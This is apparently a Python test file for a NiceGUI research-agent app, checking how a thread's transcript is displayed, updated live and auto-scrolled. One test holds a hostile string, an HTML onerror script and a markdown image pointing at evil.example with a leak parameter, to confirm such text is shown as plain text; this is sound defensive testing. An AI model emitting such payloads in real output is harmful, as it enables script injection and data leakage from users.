"""A thread shows the agent's full transcript, live, and follows it unless the user scrolls up."""

from typing import Any

import pytest
from nicegui import ElementFilter, ui
from nicegui.testing import User

from manyminds.core.errors import ModelError
from manyminds.core.models import ErrorKind, JobEventKind
from manyminds.core.ports import Progress
from support import RecordingModel

THINKING = "I should look for the official opening date first,\nthen check who measured the span."
SOURCES = "example.org: The bridge opened to traffic in March 1932."
MESSAGE = "Two archives agree on 1932. Neither says anything about its length."

LATE = [
    Progress(JobEventKind.THINKING, THINKING),
    Progress(JobEventKind.SEARCHING, "bridge opening date"),
    Progress(JobEventKind.SOURCES_FOUND, SOURCES),
    Progress(JobEventKind.MESSAGE, MESSAGE),
]

SCROLLED_UP = {"verticalPosition": 100, "verticalSize": 2000, "verticalContainerSize": 600}
AT_BOTTOM = {"verticalPosition": 1400, "verticalSize": 2000, "verticalContainerSize": 600}


def scroll_event(vertical: dict[str, float]) -> dict[str, float]:
    return {
        **vertical,
        "verticalPercentage": 0.0,
        "horizontalPosition": 0,
        "horizontalPercentage": 0,
        "horizontalSize": 0,
        "horizontalContainerSize": 0,
    }


@pytest.fixture
def scrolls(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, Any]]:
    """Record every request to move the transcript's scroll position."""
    calls: list[dict[str, Any]] = []
    monkeypatch.setattr(ui.scroll_area, "scroll_to", lambda self, **options: calls.append(options))
    return calls


async def open_first_thread(user: User, model: RecordingModel, *, hold: bool) -> None:
    model.hold = hold
    model.late_progress["Lead A"] = LATE
    await user.open("/")
    user.find(marker="composer").type("The bridge opened in 1932.")
    user.find("Generate leads").click()
    await user.should_see("Leads to research")
    user.find("Go").click()
    await user.should_see("Threads")
    if not hold:
        with user.scope(marker="thread-row-0"):
            await user.should_see("Finished")
    user.find(marker="thread-row-0").click()
    await user.should_see("Started")


def transcript_texts(user: User) -> list[str]:
    with user:
        return [label.text for label in ElementFilter(kind=ui.label, marker="transcript-text")]


async def test_a_finished_thread_shows_the_whole_transcript_in_order(
    user: User, model: RecordingModel
) -> None:
    await open_first_thread(user, model, hold=False)

    assert transcript_texts(user) == [
        "Started",
        "Searching: query for Lead A",
        THINKING,
        "Searching: bridge opening date",
        SOURCES,
        MESSAGE,
        "Report ready",
    ]


async def test_the_report_comes_after_the_transcript(user: User, model: RecordingModel) -> None:
    await open_first_thread(user, model, hold=False)

    await user.should_see("Summary")
    await user.should_see("Findings about: Lead A")
    with user:
        (area,) = ElementFilter(kind=ui.scroll_area)
        inside = [label.text for label in ElementFilter(kind=ui.label).within(instance=area)]
    assert inside.index("Report ready") < inside.index("Summary")


async def test_thinking_and_sources_are_labelled_as_such(user: User, model: RecordingModel) -> None:
    await open_first_thread(user, model, hold=False)

    await user.should_see("Thinking")
    await user.should_see("Sources found")


async def test_new_entries_are_added_live_without_rebuilding_earlier_ones(
    user: User, model: RecordingModel
) -> None:
    await open_first_thread(user, model, hold=True)
    assert transcript_texts(user) == ["Started", "Searching: query for Lead A"]
    with user:
        before = [label.id for label in ElementFilter(kind=ui.label, marker="transcript-text")]

    model.release("Lead A")
    await user.should_see(MESSAGE)
    await user.should_see("Summary")

    with user:
        after = [label.id for label in ElementFilter(kind=ui.label, marker="transcript-text")]
    assert after[:2] == before
    assert len(after) == 7


async def test_a_failed_thread_ends_its_transcript_with_the_reason(
    user: User, model: RecordingModel
) -> None:
    model.failures = {"Lead A": ModelError(ErrorKind.PROVIDER, "Upstream error")}
    await open_first_thread(user, model, hold=True)

    model.release("Lead A")
    await user.should_see("Failed")

    assert transcript_texts(user)[-1] == "Stopped: Upstream error"
    await user.should_not_see("Summary")


async def test_transcript_text_is_shown_as_plain_text(user: User, model: RecordingModel) -> None:
    hostile = '<img src=x onerror="alert(1)"> ![x](https://evil.example/?leak=1)'
    model.hold = False
    await open_first_thread(user, model, hold=False)
    model.late_progress["Lead B"] = [
        Progress(JobEventKind.THINKING, hostile),
        Progress(JobEventKind.SOURCES_FOUND, hostile),
        Progress(JobEventKind.MESSAGE, hostile),
    ]
    await user.open("/")
    user.find(marker="composer").type("Another claim.")
    user.find("Generate leads").click()
    await user.should_see("Leads to research")
    user.find("Go").click()
    with user.scope(marker="thread-row-1"):
        await user.should_see("Finished")
    user.find(marker="thread-row-1").click()
    await user.should_see("Report ready")

    assert transcript_texts(user).count(hostile) == 3
    with user:
        assert list(ElementFilter(kind=ui.html)) == []
        assert list(ElementFilter(kind=ui.markdown)) == []
        assert list(ElementFilter(kind=ui.image)) == []


async def test_opening_a_thread_jumps_to_the_end(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=False)

    assert scrolls
    assert all(call == {"percent": 1.0} for call in scrolls)


async def test_the_view_follows_new_entries(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=True)
    seen_on_open = len(scrolls)

    model.release("Lead A")
    await user.should_see("Summary")

    assert len(scrolls) > seen_on_open
    assert scrolls[-1] == {"percent": 1.0}


async def test_scrolling_up_stops_the_view_from_following(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=True)

    user.find(kind=ui.scroll_area).trigger("scroll", scroll_event(SCROLLED_UP))
    seen_before = len(scrolls)
    model.release("Lead A")
    await user.should_see("Summary")

    assert len(scrolls) == seen_before
    assert len(transcript_texts(user)) == 7


async def test_returning_to_the_end_resumes_following(
    user: User, model: RecordingModel, scrolls: list[dict[str, Any]]
) -> None:
    await open_first_thread(user, model, hold=True)

    user.find(kind=ui.scroll_area).trigger("scroll", scroll_event(SCROLLED_UP))
    user.find(kind=ui.scroll_area).trigger("scroll", scroll_event(AT_BOTTOM))
    seen_before = len(scrolls)
    model.release("Lead A")
    await user.should_see("Summary")

    assert len(scrolls) > seen_before
